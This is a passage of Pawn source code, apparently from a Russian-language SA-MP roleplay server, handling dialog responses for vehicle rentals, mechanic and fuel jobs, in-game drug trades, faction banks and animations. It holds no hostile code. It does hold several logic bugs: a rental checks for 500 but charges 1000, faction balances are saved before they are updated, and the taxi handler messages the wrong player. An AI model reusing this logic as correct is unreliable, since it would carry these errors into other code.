			DeletePVar(playerid, "OldMinerSkin");
			DeletePVar(playerid, "MinerKG");
			DeletePVar(playerid, "Noun");
			DeletePVar(playerid, "MinerKG_One");
			DeletePVar(playerid, "NounObjID");
			return true;
		}
	case D_JOB+66:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 500) { RemoveFromVehicle(playerid); return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"); }
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали транспорт за 500 долларов");
			SetPVarInt(playerid, "Mechanic", GetPlayerVehicleID(playerid));
			GiveMoney(playerid, -500);
			return true;
		}
	case 11212:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 5000) { RemoveFromVehicle(playerid); return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"); }
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали транспорт дальнобойщика за 5000 долларов");
			SetPVarInt(playerid, "TruckCar", GetPlayerVehicleID(playerid));
			GiveMoney(playerid, -5000);
			return true;
		}
	case D_JOB+67:
		{
			new playerd = GetPVarInt(playerid, "PlayerMech"), price = GetPVarInt(playerid, "MechanicPrice");
			if(response)
			{
				if(GetPlayerState(playerid) == 2)
				{
					if(GetMoney(playerid) < price)
					{
						SendMes(playerd,COLOR_LIGHTBLUE, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
						DeletePVar(playerid, "PlayerMech");
						DeletePVar(playerid, "MechanicPrice");
						return true;
					}
					SendMes(playerid,COLOR_LIGHTBLUE, "Автомеханик %s отремонтировал ваше авто за %d", sendername(playerd),price);
					SendMes(playerd,COLOR_LIGHTBLUE, "Вы отремонтировали авто %s за %d", PlayerInfo[playerid][pSendername],price);
					SetVehicleHealth(GetPlayerVehicleID(playerid),1000);
					DeletePVar(playerid, "PlayerMech");
					DeletePVar(playerid, "MechanicPrice");
					GiveMoney(playerid,-price);
					GiveMoney(playerd,price);
				}
				else SendMes(playerid, COLOR_LIGHTBLUE, "Вы должны находиться в транспорте!");
			}
			else
			{
				SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил предложение починить транспорт за %i долларов", PlayerInfo[playerid][pSendername], price);
				DeletePVar(playerid, "PlayerMech");
				DeletePVar(playerid, "MechanicPrice");
			}
		}
	case D_JOB+110:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price))
			if(price < 1 || price > 2000)
			{
				SendClientMessage(playerid, COLOR_GREY, "Материалы от 1 до 2000!");
				return ShowPlayerDialog(playerid, D_JOB+110, 1, "Оружие", "Введите кол-во материалов: от 1 до 2000шт.", "Принять", "Отмена");
			}
			new mats;
			if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
			if(price > Mats[mats])
			{
				SendClientMessage(playerid, COLOR_GREY, "Недостаточно материалов на складе!");
				return ShowPlayerDialog(playerid, D_JOB+110, 1, "Оружие", "Введите кол-во материалов: от 1 до 2000шт.", "Принять", "Отмена");
			}
			ProductKG[GetPlayerVehicleID(playerid)] += price;
			Mats[mats] -= price;
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovemats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) SetOtherInt("yakuzamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_LCN) SetOtherInt("lcnmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RM) SetOtherInt("rmmats", Mats[mats]);
			SendMes(playerid, 0x6495EDFF, "Вы взяли со склада %i материалов. В транспорте %i материалов", price, ProductKG[GetPlayerVehicleID(playerid)]);
			format(string, 90, "[F] %s взял со склада %i материалов. На складе: %i материалов", PlayerInfo[playerid][pSendername], price, Mats[mats]);
			SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
			return true;
		}
	case D_JOB+124:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 500) { RemoveFromVehicle(playerid); return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"); }
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали транспорт за 1000 долларов");
			SetPVarInt(playerid, "FuelCar", GetPlayerVehicleID(playerid));
			GiveMoney(playerid, -1000);
			if(MafiaInfo[2][mFraction] == F_YAKUZA)
			{
				FracBank[5] += 1000;
				SetOtherInt("yakuzabank", FracBank[5]);
			}
			if(MafiaInfo[2][mFraction] == F_LCN)
			{
				FracBank[6] += 1000;
				SetOtherInt("lcnbank", FracBank[6]);
			}
			if(MafiaInfo[2][mFraction] == F_RM)
			{
				FracBank[7] += 1000;
				SetOtherInt("rmbank", FracBank[7]);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 583)
			{
				SetPVarInt(playerid, "FuelCarLittle", 1);
				new full;
				for(new i = 0; i < 5; i++)
				{
					if(MafiaInfo[3][mFuel][i] > 100) full = i+1;
				}
				if(full == 0)
				{
					PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "JobLittlePrice");
					DeletePVar(playerid, "LittleFull");
					DeletePVar(playerid, "JobLittlePrice");
					DeletePVar(playerid, "FuelCarLittle");
					RemoveFromVehicle(playerid);
					return SendClientMessage(playerid, COLOR_GREY, "В скважинах нет топлива, подождите!");
				}
				SendClientMessage(playerid, COLOR_YELLOW, "Следуйте на чекпоинт, чтобы взять груз");
				SetPVarInt(playerid, "LittleFull", full);
				full--;
				if(full == 0) SetPlayerRaceCheckpoint(playerid, 1, 433.7109,1580.9321,11.4922, 0.0, 0.0, 0.0, 5.0);
				if(full == 1) SetPlayerRaceCheckpoint(playerid, 1, 600.3598,1515.3052,7.8325, 0.0, 0.0, 0.0, 5.0);
				if(full == 2) SetPlayerRaceCheckpoint(playerid, 1, 578.3732,1439.7570,11.1406, 0.0, 0.0, 0.0, 5.0);
				if(full == 3) SetPlayerRaceCheckpoint(playerid, 1, 627.6626,1369.1279,11.9845, 0.0, 0.0, 0.0, 5.0);
				if(full == 4) SetPlayerRaceCheckpoint(playerid, 1, 353.2522,1317.3221,12.4766, 0.0, 0.0, 0.0, 5.0);
			}
			return true;
		}
	case D_JOB+129:
		{
			new playerd = GetPVarInt(playerid, "PlayerDrugs"), price = GetPVarInt(playerid, "DrugsPrice"), gramm = GetPVarInt(playerid, "PlayerDrugsKG");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "PlayerDrugs");
					DeletePVar(playerid, "DrugsPrice");
					DeletePVar(playerid, "PlayerDrugsKG");
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				GiveMoney(playerid, -price);
				GiveMoney(playerd, price);
				PlayerInfo[playerd][pDrugs] -= gramm;
				PlayerInfo[playerid][pDrugs] += gramm;
				SendMes(playerd, COLOR_BLUE, "Вы продали наркотики (%i грамм) за %i долларов. Наркотиков в кармане: %i", gramm, price, PlayerInfo[playerd][pDrugs]);
				SendMes(playerid, COLOR_BLUE, "Вы купили наркотики  у %s'a (%i грамм). Цена: %i", sendername(playerd), gramm, price);
				format(string, 100, "%s достал наркотики и передал в руки %s",sendername(playerd), PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerd, 30.0, COLOR_PURPLE, string);
			}
			else SendMes(playerd, COLOR_BLUE, "%s отклонил предложение купить у вас наркотики", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "PlayerDrugs");
			DeletePVar(playerid, "DrugsPrice");
			DeletePVar(playerid, "PlayerDrugsKG");
			return true;
		}
	case D_JOB+125:
		{
			if(!response) return true;
			new price, till, i = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "p<,>ii",till,price)) return ShowPlayerDialog(playerid, D_JOB+125, 1, "Топливо", "{ffffff}Введите кол-во литров топлива и оплату (через запятую):\n\nНа {8d8dff}1{ffffff} литр топлива приходится {8d8dff}1{ffffff} доллара\n\n", "Принять", "Отмена");
			if(till < 50 || till > 50000-BizzInfo[i][bProduct])
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во топлива от 50 до 50000!");
				return ShowPlayerDialog(playerid, D_JOB+125, 1, "Топливо", "{ffffff}Введите кол-во литров топлива и оплату (через запятую):\n\nНа {8d8dff}1{ffffff} литр топлива приходится {8d8dff}1{ffffff} доллара\n\n", "Принять", "Отмена");
			}
			if(price < 5000 || price > 100000)
			{
				SendClientMessage(playerid, COLOR_GREY, "Цена за работу от 5000 до 100000!");
				return ShowPlayerDialog(playerid, D_JOB+125, 1, "Топливо", "{ffffff}Введите кол-во литров топлива и оплату (через запятую):\n\nНа {8d8dff}1{ffffff} литр топлива приходится {8d8dff}1{ffffff} доллара\n\n", "Принять", "Отмена");
			}
			if(PlayerInfo[playerid][pBank] < price+till)
			{
				ShowPlayerDialog(playerid, D_JOB+125, 1, "Топливо", "{ffffff}Введите кол-во литров топлива и оплату (через запятую):\n\nНа {8d8dff}1{ffffff} литр топлива приходится {8d8dff}1{ffffff} доллара\n\n", "Принять", "Отмена");
				return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
			}
			TOTALFUEL++;
			strmid(FuelInfo[TOTALFUEL][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
			FuelInfo[TOTALFUEL][pPrice] = price;
			FuelInfo[TOTALFUEL][pTill] = till;
			FuelInfo[TOTALFUEL][pBizzid] = i;
			FuelInfo[TOTALFUEL][pStatus] = false;
			PlayerInfo[playerid][pBank] -= price;
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i литро топлива, оплата %i долларов. Остаток на счете: %i долларов", till, price, PlayerInfo[playerid][pBank]);
			for(new p = 0; p < MAX_PLAYERS; p++)
			{
				if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_FUEL) continue;
				SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ от %s. Используйте: /flist", PlayerInfo[playerid][pSendername]);
			}
		}
	case D_JOB+126:
		{
			if(!response) return true;
			SetPVarInt(playerid, "FuelID", listitem+1);
			format(string, 256, "{ffffff}Номер заказа {8D8DFF}\t\t№%i %s\n\n{ffffff}Заказал:\t\t{8D8DFF}%s\n{ffffff}Куда:\t\t\t{8D8DFF}%s\n{ffffff}Количество:\t\t{8D8DFF}%i {ffffff}литров топлива\n{ffffff}Оплата:\t\t{8D8DFF}%i{ffffff} долларов",
			listitem+1, (!FuelInfo[listitem+1][pStatus]) ? ("{8D8DFF}(Доступен)") : ("{FF6347}(Выполняется)"), FuelInfo[listitem+1][pName], BizzInfo[FuelInfo[listitem+1][pBizzid]][bName],FuelInfo[listitem+1][pTill], FuelInfo[listitem+1][pPrice]);
			ShowPlayerDialog(playerid, D_JOB+127, 0, "Заказ", string, "Принять", "Назад");
		}
	case D_JOB+127:
		{
			if(!response) { DeletePVar(playerid, "FuelID"); return FuelList(playerid); }
			if(strcmp(FuelInfo[GetPVarInt(playerid, "FuelID")][pName], PlayerInfo[playerid][pSendername], true) == 0) { DeletePVar(playerid, "FuelID"); FuelList(playerid); return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь выполнить свой заказ!"); }
			if(FuelInfo[GetPVarInt(playerid, "FuelID")][pStatus] == true) { SendClientMessage(playerid, COLOR_GREY, "Заказ уже выполняется кем-либо!"); DeletePVar(playerid, "FuelID"); return FuelList(playerid); }
			if(FuelInfo[GetPVarInt(playerid, "FuelID")][pTill] > FuelBank) { SendClientMessage(playerid, COLOR_GREY, "На заводе недостаточно топлива!"); DeletePVar(playerid, "FuelID"); return FuelList(playerid); }
			new Float:VPos[3], i = FuelInfo[GetPVarInt(playerid, "FuelID")][pBizzid];
			FuelBank-=FuelInfo[GetPVarInt(playerid, "FuelID")][pTill];
			SetOtherInt("fuelbank", FuelBank);
			format(string, 50, "Топлива на заводе: {FF9900}%i{ffffff} литров", FuelBank);
			Update3DTextLabelText(tPickup[25], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[26], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[27], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[28], 0xFFFFFFFF, string);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы приняли заказ от %s. Чтобы отменить, введите: /cancel", FuelInfo[GetPVarInt(playerid, "FuelID")][pName]);
			GetPlayerPos(playerid, VPos[0], VPos[1], VPos[2]);
			DisablePlayerRaceCheckpoint(playerid);
			FuelInfo[GetPVarInt(playerid, "FuelID")][pStatus] = true;
			SetPlayerRaceCheckpoint(playerid, 1, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz], 0.0,0.0,0.0,6);
			SendMes(playerid, COLOR_YELLOW, "На карте отмечен: %s. Расстояние: %.1f метров",BizzInfo[i][bName],GetDistanceBetweenPoints(VPos[0], VPos[1], VPos[2], BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
			format(string, 100, "{9ACD32}Топлива: {ffffff}%i / 50000{9acd32} литров", FuelInfo[GetPVarInt(playerid, "FuelID")][pTill]);
			FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D] = Create3DTextLabel(string, 0xffffffff, 0.0, 0.0, 0.0, 30.0, 0, 1);
			Attach3DTextLabelToVehicle(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D], GetPlayerVehicleID(playerid), 0, -1.0, 2.0);

		}
	case D_JOB+128:
		{
			if(!response) return true;
			new fuel;
			new bizz = BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bTill] / 3;
			if(sscanf(inputtext, "i",fuel)) return ShowPlayerDialog(playerid, D_JOB+128, 1,"Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			if(fuel < 1 || fuel > 200)
			{
				SendClientMessage(playerid, COLOR_GREY, "Топлива от 1 до 200 литров!");
				return ShowPlayerDialog(playerid, D_JOB+128, 1,"Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			}
			if(fuel+Fuel[GetPlayerVehicleID(playerid)] > 200)
			{
				SendMes(playerid, COLOR_GREY, "Слишком много топлива. Рекомендуем: %i литров", 200-Fuel[GetPlayerVehicleID(playerid)]);
				return ShowPlayerDialog(playerid, D_JOB+128, 1,"Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			}
			if(fuel*bizz > GetMoney(playerid))
			{
				SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
				return ShowPlayerDialog(playerid, D_JOB+128, 1, "Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			}
			if(fuel > BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct])
			{
				SendClientMessage(playerid, COLOR_GREY, "Недостаточно топлива на заправке!");
				return ShowPlayerDialog(playerid, D_JOB+128, 1, "Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			}
			new price = fuel*bizz;
			GiveMoney(playerid, -price);
			BizzPay[GetPVarInt(playerid, "FuelBizzID")] += price;
			BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += price;
			BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= fuel;
			SetBizzInt(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][id], "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
			DeletePVar(playerid, "FuelBizzID");
			SendClientMessage(playerid, COLOR_YELLOW, "Транспорт заправляется, пожалуйста подождите");
			SetPVarInt(playerid, "Refueling", fuel);
			TogglePlayerControllable(playerid, false);
			ReFuelTimer[playerid] = SetTimerEx("ReFill", 500, true, "i", playerid);
			return true;
		}
	case D_JOB+130:
		{
			new playerd = GetPVarInt(playerid, "MechanicPlayer"), price = GetPVarInt(playerid, "MechanicPrice");
			if(response)
			{
				if(GetPlayerState(playerid) == 2)
				{
					if(GetMoney(playerid) < price)
					{
						SendMes(playerd,COLOR_LIGHTBLUE, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
						DeletePVar(playerid, "MechanicPlayer");
						DeletePVar(playerid, "MechanicPrice");
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
					}
					if(Fuel[GetPlayerVehicleID(playerid)] >= 200)
					{
						SendMes(playerd, COLOR_BLUE, "У игрока достаточно бензина в баке");
						DeletePVar(playerid, "MechanicPlayer");
						DeletePVar(playerid, "MechanicPrice");
						return SendClientMessage(playerid, COLOR_GREY, "У вас достаточно бензина в баке");
					}
					GiveMoney(playerid, -price);
					PlayerInfo[playerid][pBank] += price;
					SendMes(playerid, COLOR_BLUE, "Автомеханик %s заправил ваш транспорт за %i долларов", sendername(playerd), price);
					SendMes(playerd, COLOR_BLUE, "Вы заправили транспорт %s'a за %i долларов", PlayerInfo[playerid][pSendername], price);
					Fuel[GetPlayerVehicleID(playerid)] = 200;
				}
				else SendMes(playerid, COLOR_LIGHTBLUE, "Вы должны находиться в транспорте!");
			}
			else
			{
				SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил предложение заправить транспорт за %i долларов", PlayerInfo[playerid][pSendername], price);
				DeletePVar(playerid, "MechanicPlayer");
				DeletePVar(playerid, "MechanicPrice");
			}
		}
	case D_JOB+131:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialog(playerid, D_JOB+132, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			case 1: ShowPlayerDialog(playerid, D_JOB+133, 1, "Ввод", "Введите кол-во долларов:", "Принять", "Назад");
			case 2: BankFracEnter(playerid);
			}
		}
	case D_JOB+132:
		{
			if(!response) return BankFracEnter(playerid);
			new price, bank;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			if(PlayerInfo[playerid][pMember] == F_GROVE) bank = FracBank[0];
			if(PlayerInfo[playerid][pMember] == F_BALLAS) bank = FracBank[1];
			if(PlayerInfo[playerid][pMember] == F_RIFA) bank = FracBank[2];
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) bank = FracBank[3];
			if(PlayerInfo[playerid][pMember] == F_VAGOS) bank = FracBank[4];
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) bank = FracBank[5];
			if(PlayerInfo[playerid][pMember] == F_LCN) bank = FracBank[6];
			if(PlayerInfo[playerid][pMember] == F_RM) bank = FracBank[7];
			if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS) bank = FracBank[8];
			if(PlayerInfo[playerid][pMember] == F_CASINO) bank = FracBank[11];
			if(price < 1 || price > bank)
			{
				SendMes(playerid, COLOR_GREY, "Кол-во долларов от 1 до %i!", bank);
				return ShowPlayerDialog(playerid, D_JOB+132, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			}
			SendMes(playerid, COLOR_BLUE, "Вы вывели %i долларов из банка организации. Остаток: %i долларов", price, bank-price);
			GiveMoney(playerid, price);
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovebank", FracBank[0]),FracBank[0]-=price;
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasbank", FracBank[1]),FracBank[1]-=price;
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifabank", FracBank[2]),FracBank[2]-=price;
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasbank", FracBank[3]),FracBank[3]-=price;
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosbank", FracBank[4]),FracBank[4]-=price;
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) SetOtherInt("yakuzabank", FracBank[5]),FracBank[5]-=price;
			if(PlayerInfo[playerid][pMember] == F_LCN) SetOtherInt("lcnbank", FracBank[6]),FracBank[6]-=price;
			if(PlayerInfo[playerid][pMember] == F_RM) SetOtherInt("rmbank", FracBank[7]),FracBank[7]-=price;
			if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS) SetOtherInt("ntoday", FracBank[8]),FracBank[8]-=price;
			if(PlayerInfo[playerid][pMember] == F_CASINO) SetOtherInt("CASINObank", FracBank[11]),FracBank[11]-=price;
			return true;
		}
	case D_JOB+133:
		{
			new price, bank;
			if(!response) return BankFracEnter(playerid);
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+133, 1, "Ввод", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1 || price > GetMoney(playerid))
			{
				SendMes(playerid, COLOR_GREY, "Кол-во доллларов от 1 до %i!", GetMoney(playerid));
				return ShowPlayerDialog(playerid, D_JOB+133, 1, "Ввод", "Введите кол-во долларов:", "Принять", "Назад");
			}
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+132, 1, "Вывод", "Введите кол-во долларов:", "Принять", "Назад");
			if(PlayerInfo[playerid][pMember] == F_GROVE) bank = FracBank[0];
			if(PlayerInfo[playerid][pMember] == F_BALLAS) bank = FracBank[1];
			if(PlayerInfo[playerid][pMember] == F_RIFA) bank = FracBank[2];
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) bank = FracBank[3];
			if(PlayerInfo[playerid][pMember] == F_VAGOS) bank = FracBank[4];
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) bank = FracBank[5];
			if(PlayerInfo[playerid][pMember] == F_LCN) bank = FracBank[6];
			if(PlayerInfo[playerid][pMember] == F_RM) bank = FracBank[7];
			if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS) bank = FracBank[8];
			if(PlayerInfo[playerid][pMember] == F_CASINO) bank = FracBank[11];
			new sbank = bank+price;
			SendMes(playerid, COLOR_BLUE, "Вы ввели %i долларов на счет банка организации. Теперь в банке: %i долларов", price, sbank);
			GiveMoney(playerid, -price);
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovebank", FracBank[0]),FracBank[0]+=price;
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasbank", FracBank[1]),FracBank[1]+=price;
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifabank", FracBank[2]),FracBank[2]+=price;
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasbank", FracBank[3]),FracBank[3]+=price;
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosbank", FracBank[4]),FracBank[4]+=price;
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) SetOtherInt("yakuzabank", FracBank[5]),FracBank[5]+=price;
			if(PlayerInfo[playerid][pMember] == F_LCN) SetOtherInt("lcnbank", FracBank[6]),FracBank[6]+=price;
			if(PlayerInfo[playerid][pMember] == F_RM) SetOtherInt("rmbank", FracBank[7]),FracBank[7]+=price;
			if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS) SetOtherInt("ntoday", FracBank[8]),FracBank[8]+=price;
			if(PlayerInfo[playerid][pMember] == F_CASINO) SetOtherInt("CASINObank", FracBank[11]),FracBank[11]+=price;
			return true;
		}
	case D_JOB+134:
		{
			if(!response) return true;
			if(MechCallTime[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже приняли вызов!");
			if(MechCall == -1) return SendClientMessage(playerid, COLOR_GREY, "Никто не вызывал механика!");
			if(!IsPlayerConnected(MechCall)) return SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(PlayerInfo[i][pJob] == J_MECHANIC) SendMes(i, COLOR_ALLDEPT, "Автомеханик %s принял вызов %s'а",PlayerInfo[playerid][pSendername], sendername(MechCall));
			}
			SendMes(MechCall, COLOR_LIGHTBLUE, "Автомеханик %s принял ваш вызов", PlayerInfo[playerid][pSendername]);
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы приняли вызов. %s находится в %.1f метрах от вас", sendername(MechCall), GetDistanceBetweenPlayers(playerid, MechCall));
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(MechCall, X, Y, Z);
			SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
			SetPVarInt(MechCall, "CallMech", gettime() + 600);
			MechCallTime[playerid] = 180;
			MechCall = -1;
		}
	case D_JOB+135:
		{
			if(!response) return true;
			if(TaxiCallTime[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже приняли вызов!");
			if(TaxiCall == -1) return SendClientMessage(playerid, COLOR_GREY, "Никто не вызывал таксиста!");
			if(!IsPlayerConnected(TaxiCall)) return SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(PlayerInfo[i][pJob] == J_TAXI) SendMes(i, COLOR_ALLDEPT, "Таксист %s принял вызов %s'а",PlayerInfo[playerid][pSendername], sendername(TaxiCall));
			}
			SendMes(MechCall, COLOR_LIGHTBLUE, "Таксист %s принял ваш вызов", PlayerInfo[playerid][pSendername]);
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы приняли вызов. %s находится в %.1f метрах от вас", sendername(TaxiCall), GetDistanceBetweenPlayers(playerid, TaxiCall));
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(TaxiCall, X, Y, Z);
			SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
			SetPVarInt(TaxiCall, "CallTaxi", gettime() + 600);
			TaxiCallTime[playerid] = 180;
			TaxiCall = -1;
		}
	case D_JOB+136:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE1);
			case 1: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE2);
			case 2: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE3);
			case 3: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE4);
			case 4: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_HANDSUP);
			case 5: ApplyAnimation(playerid,"SMOKING","M_smklean_loop",4.1, 1, 1, 1, 1, 0 ,1);
			case 6: ApplyAnimation(playerid,"PED","fucku",4.0,0,0,0,0,0,1);
			case 7: ApplyAnimation(playerid,"INT_OFFICE","OFF_Sit_Crash",4.1,0,1,1,1,1,1);
			case 8: ApplyAnimation(playerid,"BEACH","SitnWait_loop_W",4.1,0,1,1,1,1,1);
			case 9: ApplyAnimation(playerid,"BEACH","Lay_Bac_Loop",4.1,0,1,1,1,1,1);
			case 10: ApplyAnimation(playerid,"GANGS","hndshkba",4.1,0,1,1,1,1,1);
			case 11: ApplyAnimation(playerid,"GANGS","smkcig_prtl",4.1,0,1,1,1,1,1);
			case 12: ApplyAnimation( playerid, "DANCING", "dnce_M_b", 4.1, 1, 1, 1, 1, 0 ,1);
			case 13: ApplyAnimation( playerid, "DANCING", "dnce_M_a", 4.1, 1, 1, 1, 1, 0 ,1);
			case 14: ApplyAnimation( playerid, "DANCING", "dnce_M_b", 4.1, 1, 1, 1, 1, 0 ,1);
			case 15: ApplyAnimation( playerid, "DANCING", "DAN_Down_A", 4.1, 1, 1, 1, 1, 0 ,1);
			case 16: ApplyAnimation( playerid, "DANCING", "DAN_Left_A", 4.1, 1, 1, 1, 1, 0 ,1);
			case 17: ApplyAnimation( playerid, "DANCING", "DAN_Loop_A", 4.1, 1, 1, 1, 1, 0 ,1);
			case 18: ApplyAnimation( playerid, "BEACH", "ParkSit_W_Loop", 4.1, 1, 1, 1, 1, 1 ,1);
			case 19: ApplyAnimation( playerid, "DEALER", "DEALER_DEAL", 4.1, 1, 1, 1, 1, 1 ,1);
			case 20: ApplyAnimation( playerid, "DEALER", "DEALER_IDLE_01", 4.1, 1, 1, 1, 1, 1 ,1);
			case 21: ApplyAnimation( playerid, "DEALER", "DEALER_IDLE_03", 4.1, 1, 1, 1, 1, 1 ,1);
			case 22: ApplyAnimation( playerid, "DEALER", "DRUGS_BUY", 4.1, 1, 1, 1, 1, 1 ,1);
			case 23: ApplyAnimation( playerid, "RYDER", "RYD_Die_PT1", 4.1, 1, 1, 1, 1, 1 ,1);
			case 24: ApplyAnimation(playerid,"PED","SEAT_down", 4.1, 0, 0, 0, 0, 0 ,1);
			}
			return true;
		}
	case D_JOB+137:
		{
			if(!response) return true;
			new str[32], leader[MAX_PLAYER_NAME], assistant[MAX_PLAYER_NAME];
			if(!strcmp(FracInfo[listitem+1][fLeader], "None",true)) format(leader, sizeof(leader), "Нет");
			else format(leader, sizeof(leader), "%s", FracInfo[listitem+1][fLeader]);
			if(!strcmp(FracInfo[listitem+1][fAssistant], "None",true)) format(assistant, sizeof(assistant), "Нет");
			else format(assistant, sizeof(assistant), "%s", FracInfo[listitem+1][fAssistant]);
			format(string, 256, "Руководитель: %s\nЗаместитель: %s\nСнять руководителя\nСнять заместителя", leader, assistant);
			format(str, sizeof(str), "%s", FracInfo[listitem+1][fName]);
			ShowPlayerDialog(playerid, D_JOB+138, 2, str, string, "Принять", "Отмена");
			SetPVarInt(playerid, "NumberFrac", listitem+1);
			return true;
		}
	case D_JOB+138:
		{
			if(!response) return true;
			new playerd, i = GetPVarInt(playerid, "NumberFrac");
			switch(listitem)
